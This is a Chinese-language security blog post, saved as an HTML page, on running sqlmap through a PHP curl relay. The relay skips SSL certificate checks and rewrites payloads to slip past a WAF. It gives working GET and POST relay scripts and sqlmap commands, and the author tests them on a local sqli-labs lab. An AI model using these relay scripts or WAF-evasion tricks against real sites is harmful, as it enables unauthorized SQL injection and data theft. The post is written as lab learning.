@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="sqlmap,sql注入,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="今天学习到一篇文章，讲的是如何利用sqlmap对有ssl通信的网站进行注入。sqlmap原本没有绕过ssl的temper，所以这时候就需要自己建立一个中转脚本，可以忽略ssl进行访问。如PHP的curl。 原文链接：实战sqlmap绕过WAFSQLMAP配合PHP中转忽略ssl">
+<meta name="keywords" content="sqlmap,sql注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap中转注入">
+<meta property="og:url" content="http://yoursite.com/2021/10/30/sqlmap中转注入/index.html">
+<meta property="og:site_name" content="pukr&#39;s BLOG">
+<meta property="og:description" content="今天学习到一篇文章，讲的是如何利用sqlmap对有ssl通信的网站进行注入。sqlmap原本没有绕过ssl的temper，所以这时候就需要自己建立一个中转脚本，可以忽略ssl进行访问。如PHP的curl。 原文链接：实战sqlmap绕过WAFSQLMAP配合PHP中转忽略ssl">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2021/10/30/sqlmap中转注入/注入点.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/10/30/sqlmap中转注入/中转.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/10/30/sqlmap中转注入/payload.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/10/30/sqlmap中转注入/success.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/10/30/sqlmap中转注入/payload_post.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/10/30/sqlmap中转注入/success_post.jpg">
+<meta property="og:updated_time" content="2022-04-24T00:31:05.762Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqlmap中转注入">
+<meta name="twitter:description" content="今天学习到一篇文章，讲的是如何利用sqlmap对有ssl通信的网站进行注入。sqlmap原本没有绕过ssl的temper，所以这时候就需要自己建立一个中转脚本，可以忽略ssl进行访问。如PHP的curl。 原文链接：实战sqlmap绕过WAFSQLMAP配合PHP中转忽略ssl">
+<meta name="twitter:image" content="http://yoursite.com/2021/10/30/sqlmap中转注入/注入点.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/10/30/sqlmap中转注入/">
+
+
+
+
+
+  <title>sqlmap中转注入 | pukr's BLOG</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pukr's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">人类的悲欢并不相通</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/10/30/sqlmap中转注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="尘林">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/zql.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pukr's BLOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sqlmap中转注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-10-30T09:08:06+08:00">
+                2021-10-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>今天学习到一篇文章，讲的是如何利用sqlmap对有ssl通信的网站进行注入。sqlmap原本没有绕过ssl的temper，所以这时候就需要自己建立一个中转脚本，可以忽略ssl进行访问。如PHP的curl。</p>
+<p>原文链接：<br><a href="https://mp.weixin.qq.com/s?__biz=MzU2NDY2OTU4Nw==&amp;mid=2247491552&amp;idx=1&amp;sn=ec05fadbcf5a145b5b075c908d46e4b2&amp;chksm=fc46221ccb31ab0a915c4e4655ef019dd4ac4dd376792cf13565791d483d3a2bde74d8e32b53&amp;mpshare=1&amp;scene=23&amp;srcid=1027pEdmUyUx1ghMNgY0MwpI&amp;sharer_sharetime=1635293163845&amp;sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd" target="_blank" rel="noopener">实战sqlmap绕过WAF</a><br><a href="https://cloud.tencent.com/developer/article/1680586" target="_blank" rel="noopener">SQLMAP配合PHP中转忽略ssl</a><br><a id="more"></a></p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>原理就是利用PHP的curl模块可以选择不验证证书和hosts，然后curl请求有ssl的注入点，如图。<br><img src="/2021/10/30/sqlmap中转注入/注入点.jpg" alt></p>
+<p><img src="/2021/10/30/sqlmap中转注入/中转.jpg" alt></p>
+<p>关于ssl的相关知识可以百度、B站、知乎进行搜索。</p>
+<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>没有找到应用了ssl的注入点。。于是只能用sqli-labs看看具体操作。<br>Ubuntu在昨天做ssrf的时候刚好开启了PHP的curl，于是就用ubuntu做中转了，其实windows、kali、ubuntu都可以，而且kali做中转最快，因为是本地。</p>
+<h2 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h2><p>中转脚本：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>); </span><br><span class="line">$id=$_GET[<span class="string">"id"</span>]; </span><br><span class="line">$id=str_replace(<span class="string">" "</span>,<span class="string">"/**/"</span>,$id); </span><br><span class="line">$id=str_replace(<span class="string">"="</span>,<span class="string">"%3D"</span>,$id); <span class="comment">//这些编码机制可以自己的需求设定，毕竟实战的环境变换多样</span></span><br><span class="line">$url = <span class="string">"http://192.168.0.161:8081/sqli-labs-master/Less-1/?id="</span>.$id;</span><br><span class="line"><span class="keyword">echo</span> $url;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, <span class="string">"$url"</span>); </span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>); <span class="comment">// https请求 不验证证书</span></span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>);<span class="comment">//https请求 不验证hosts</span></span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 函数执行如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);<span class="comment">//如果你想把一个头包含在输出中，设置这个选项为一个非零值   </span></span><br><span class="line">$output = curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line">print_r($output);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后kali使用sqlmap：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u "http://192.168.0.171/zz.php?id=1" -v 3 --batch -tecnueq U</span><br></pre></td></tr></table></figure></p>
+<p>使用wireshark抓包看看payload：<br><img src="/2021/10/30/sqlmap中转注入/payload.jpg" alt><br>成功注入：<br>为什么这么慢啊哭，半个小时。。<br><img src="/2021/10/30/sqlmap中转注入/success.jpg" alt></p>
+<h2 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h2><p>中转脚本：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">"http://192.168.0.161:8081/sqli-labs-master/Less-11/"</span>;</span><br><span class="line">$sql = $_GET[s];<span class="comment">//获取中转脚本传过来的payload </span></span><br><span class="line">$s = urlencode($sql);</span><br><span class="line">$params = <span class="string">"uname=admin$s&amp;passwd=aa"</span>;</span><br><span class="line">$ch = curl_init();<span class="comment">// 创建一个新cURL资源</span></span><br><span class="line"> curl_setopt($ch, CURLOPT_URL, $url);<span class="comment">//这是你想用PHP取回的URL地址，可以在用curl_init()函数初始化时设置这个选项</span></span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>); <span class="comment">// https请求 不验证证书</span></span><br><span class="line">curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="keyword">FALSE</span>);<span class="comment">//https请求 不验证hosts</span></span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); <span class="comment">// 函数执行如果成功只将结果返回，不自动输出任何内容。如果失败返回FALSE</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);<span class="comment">//如果你想把一个头包含在输出中，设置这个选项为一个非零值   </span></span><br><span class="line">curl_setopt($ch, CURLOPT_USERAGENT, <span class="string">'Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)'</span>);<span class="comment">// 在HTTP请求中自定义一个”user-agent”头的字符串</span></span><br><span class="line">curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">15</span>);<span class="comment">//为了应对目标服务器的过载，下线，或者崩溃等可能状况。</span></span><br><span class="line">curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>);    <span class="comment">// post 提交方式</span></span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $params);</span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器 </span></span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">curl_close($ch);</span><br><span class="line">$a = strlen($output);</span><br><span class="line"><span class="comment">//echo $a;</span></span><br><span class="line"><span class="keyword">if</span>($a==<span class="number">2846</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"1"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"2"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>kali打开sqlmap：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali430:~# sqlmap -u "http://192.168.0.171/zzpost.php?s=1" --batch --dbms mysql</span><br></pre></td></tr></table></figure></p>
+<p>wireshark查看payload：<br><img src="/2021/10/30/sqlmap中转注入/payload_post.jpg" alt><br>成功注入：<br><img src="/2021/10/30/sqlmap中转注入/success_post.jpg" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sqlmap/" rel="tag"># sqlmap</a>
+          
+            <a href="/tags/sql注入/" rel="tag"># sql注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/10/16/解决hexo在deploy时重复输入用户名密码且报错问题/" rel="next" title="解决hexo在deploy时重复输入用户名密码且报错问题">
+                <i class="fa fa-chevron-left"></i> 解决hexo在deploy时重复输入用户名密码且报错问题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/12/07/coppersmith相关密码学/" rel="prev" title="coppersmith相关密码学">
+                coppersmith相关密码学 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/zql.jpg" alt="尘林">
+            
+              <p class="site-author-name" itemprop="name">尘林</p>
+              <p class="site-description motion-element" itemprop="description">势，只会裹挟随波逐流之人。一心既定，便不问大势所趋。</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">63</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#原理"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#测试"><span class="nav-number">2.</span> <span class="nav-text">测试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GET型"><span class="nav-number">2.1.</span> <span class="nav-text">GET型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST型"><span class="nav-number">2.2.</span> <span class="nav-text">POST型</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">尘林</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
